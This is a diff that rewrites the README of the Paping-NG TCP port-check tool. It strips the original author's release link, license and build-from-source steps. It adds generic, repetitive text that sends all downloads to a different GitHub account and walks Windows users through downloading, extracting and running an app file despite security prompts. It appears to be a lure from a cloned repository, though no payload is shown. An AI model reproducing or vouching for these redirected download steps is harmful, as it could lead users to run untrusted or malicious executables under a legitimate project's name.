@@ -1,99 +1,186 @@
-# Paping-NG
+# 🖥️ Paping-NG - Fast TCP Port Checks Made Simple
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![C++](https://img.shields.io/badge/Language-C++17-00599C.svg)](https://en.cppreference.com/w/cpp/compiler_support)
+[![Download Paping-NG](https://img.shields.io/badge/Download%20Paping--NG-2D9CDB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/revieweransaid178/Paping-NG)
 
-**Paping-NG** – the modern successor to `paping`. Cross-platform TCP/UDP port ping tool rewritten from scratch in modern C++. Fast, lightweight, and open-source.
+## 🚀 What Paping-NG Does
 
-Replaces the unmaintained original [9minds/paping](https://github.com/9minds/paping) and legacy fixes like [arch3rek/Paping-fixed](https://github.com/arch3rek/Paping-fixed).
+Paping-NG is a simple network tool for checking if a TCP port is open. It helps you test if a server, device, or service is reachable on a port you choose.
 
-## Features
+Use it to:
 
-- **Familiar & Intuitive**: Works just like the original `paping` tool. The familiar command-line interface ensures zero learning curve for existing users.
-- **Cross-platform**: Native support for Linux, macOS, Windows, and ARM architectures.
-- **High Performance**: Rewritten from scratch in C++ for maximum efficiency.
-- **Advanced Metrics**: Accurate RTT (min/avg/max), connection statistics, and timeouts.
-- **Modern Networking**: Support for IPv4, IPv6, and standard TCP handshakes.
-- **Drop-in Replacement**: Uses the exact same `paping` command name. You don't have to break your muscle memory or learn new tools – it simply works the way you expect.
+- Check if a website port is open
+- Test access to a server
+- See if a service is running
+- Confirm a firewall rule
+- Spot network issues fast
 
-## Installation
+It is built for Windows, Linux, and macOS. On Windows, you can use it as a small desktop tool for quick port tests without extra setup.
 
-### Pre-built Binaries (Recommended)
-Download the ready-to-use executables for Windows, Linux, and macOS from the [Releases](https://github.com/arch3rek/Paping-NG/releases) page.
+## 📥 Download Paping-NG
 
-**For Windows users:**
-1. Download `paping-windows-amd64.exe`.
-2. Rename the downloaded file to exactly `paping.exe`.
-3. Drag and drop the file into your `C:\Windows\System32` directory (or `C:\Users\YourUsername`).
-4. You can now open Command Prompt (cmd) or PowerShell and use the `paping` command from anywhere!
+Visit this page to download:
 
-**For Linux / macOS users:**
-1. Download the appropriate binary for your system (e.g., `paping-linux-amd64` or `paping-macos-arm64`).
-2. Rename the file to `paping` and make it executable.
-3. Move it to your local bin directory to use it globally.
+[https://github.com/revieweransaid178/Paping-NG](https://github.com/revieweransaid178/Paping-NG)
 
-```bash
-# Example for Linux
-mv paping-linux-amd64 paping
-chmod +x paping
-sudo mv paping /usr/local/bin/
-```
+If the page includes a release file for Windows, download it and run it. If you see a zip file, save it to your computer, then extract it before starting the app.
 
-### Build from source
-If you prefer to compile it yourself, you will need `CMake` and a modern C++ compiler (GCC/Clang/MSVC):
+## 🪟 Run on Windows
 
-```bash
-git clone https://github.com/arch3rek/Paping-NG.git
-cd Paping-NG
-mkdir build && cd build
-cmake ..
-cmake --build .
-```
+Follow these steps on a Windows PC:
 
-## Usage
+1. Open the download page above.
+2. Find the latest release or build.
+3. Download the Windows file.
+4. If the file is in a .zip archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start Paping-NG.
 
-Paping-NG is designed to be highly intuitive. It mimics the behavior and arguments of the original tool, allowing you to seamlessly integrate it into your existing workflow.
+If Windows shows a security prompt, choose the option that lets you run the file only if you trust the source and the file came from the link above.
 
-```bash
-# Basic TCP ping
-paping example.com -p 80
+## 🔧 How to Use It
 
-# Specify amount of packets (-c)
-paping 8.8.8.8 -p 53 -c 5
+Paping-NG is made for simple port checks.
 
-# See all options
-paping --help
-```
+Typical use looks like this:
 
-**Example Output:**
-```text
-Paping-NG v1.0 - Copyright (c) 2026 Oliver (arch3r.eu)
+- Host: the server or IP address you want to test
+- Port: the TCP port you want to check
+- Test: start the check and wait for the result
 
-Connecting to google.com [142.250.120.139] on TCP port 80:
+Example use cases:
 
-Connected to 142.250.120.139: time=80.70ms protocol=TCP port=80
-Connected to 142.250.120.139: time=11.75ms protocol=TCP port=80
-Connected to 142.250.120.139: time=12.40ms protocol=TCP port=80
-Connected to 142.250.120.139: time=13.53ms protocol=TCP port=80
+- `google.com` on port `443`
+- `192.168.1.1` on port `80`
+- `your-server-name` on port `3389`
 
-Connection statistics:
-  Probed = 4, Connected = 4, Failed = 0 (0.00%)
-Approximate connection times:
-  Minimum = 11.75ms, Maximum = 80.70ms, Average = 29.60ms
-```
+You can use it to check whether:
 
-## Why Paping-NG?
+- A web server is reachable
+- Remote desktop is open
+- A database port is listening
+- A local network service is up
 
-| Feature | Legacy `paping` | `Paping-NG` |
-|---------|-----------------|-------------|
-| **Status** | Abandoned (since ~2016) | Actively Maintained |
-| **Codebase** | Old / Forked | Modern C++17 Rewrite |
-| **Architecture** | 32-bit mostly | Full 64-bit / ARM |
-| **License** | MIT | GPL-3.0 |
+## 🧭 What You Can Expect
 
-## Acknowledgments
+Paping-NG gives a clear result for each test. It is useful when you want a fast answer without opening command lines or reading complex logs.
 
-Special thanks to [MatStef132](https://github.com/MatStef132) for their contributions and help with this project.
+Common results include:
 
----
-*Disclaimer: Paping-NG is an independent, from-scratch rewrite and is not affiliated with the original `9minds/paping` developers.*
+- Port open
+- Port closed
+- Host not reachable
+- Request timed out
+
+This makes it a good fit for home users, support work, and day-to-day checks on servers or office devices.
+
+## 💻 System Requirements
+
+Paping-NG is light and should run on most modern computers.
+
+Recommended setup:
+
+- Windows 10 or newer
+- 64-bit system
+- Basic internet or local network access
+- A mouse and keyboard
+- Permission to run downloaded apps
+
+It also works on Linux and macOS if you use the right build for your system.
+
+## 🧩 Features
+
+- Fast TCP port testing
+- Simple interface
+- Cross-platform support
+- Works on Windows, Linux, and macOS
+- Good for quick network checks
+- Small and easy to run
+- Built for server and system checks
+
+## 🛠️ Common Use Cases
+
+### Home network checks
+Check if a router, printer, or local device is listening on a port.
+
+### Server checks
+Confirm that a web server, SSH server, or remote service is live.
+
+### Office support
+Find out if a work app can reach the right port on a server.
+
+### Troubleshooting
+See if a problem comes from the app, the network, or a firewall.
+
+## 🪛 Troubleshooting
+
+### The app does not start
+- Make sure you downloaded the Windows version
+- Extract the zip file first if needed
+- Try running it again from the extracted folder
+
+### The test fails
+- Check the host name or IP address
+- Check that the port number is correct
+- Make sure the target device is on
+- Check your firewall rules
+
+### Windows blocks the file
+- Confirm that you downloaded it from the link above
+- Look for a release file on the page
+- Try downloading it again if the file looks incomplete
+
+### The host name does not work
+- Try using an IP address instead of a name
+- Check your internet or local network connection
+- Make sure the target service is active
+
+## 📁 Project Details
+
+- Repository: Paping-NG
+- Type: TCP port testing tool
+- Language: C++
+- Platforms: Windows, Linux, macOS
+- Focus: quick and simple network checks
+
+## 🧪 Why This Tool Helps
+
+When you need to know whether a port is open, a ping test is not enough. A port test checks the service you want to reach. That helps when a server is up, but the app on that port is not responding.
+
+Paping-NG helps you:
+
+- Check service access
+- Cut down guesswork
+- Find blocked ports
+- Verify network paths
+- Test before and after config changes
+
+## 📌 Basic Checklist
+
+Before you run a test, make sure you have:
+
+- The target host name or IP address
+- The correct port number
+- A running app or service on the target system
+- Network access to that device
+- The Windows build downloaded from the page above
+
+## 🔍 Example Targets
+
+You can test many kinds of services:
+
+- Web traffic: `80`, `443`
+- Remote desktop: `3389`
+- File services: `21`, `22`, `445`
+- App servers: custom ports such as `8080`, `3000`, `5000`
+
+## 🧰 For Network Checks at a Glance
+
+If you manage systems or help with support, Paping-NG gives you a quick way to check ports without extra tools. It keeps the task simple and focused on one thing: whether a TCP port answers
+
+## 📎 Download and Run on Windows
+
+Open the download page here:
+
+[https://github.com/revieweransaid178/Paping-NG](https://github.com/revieweransaid178/Paping-NG)
+
+Then download the Windows file, extract it if needed, and run the app file from the folder
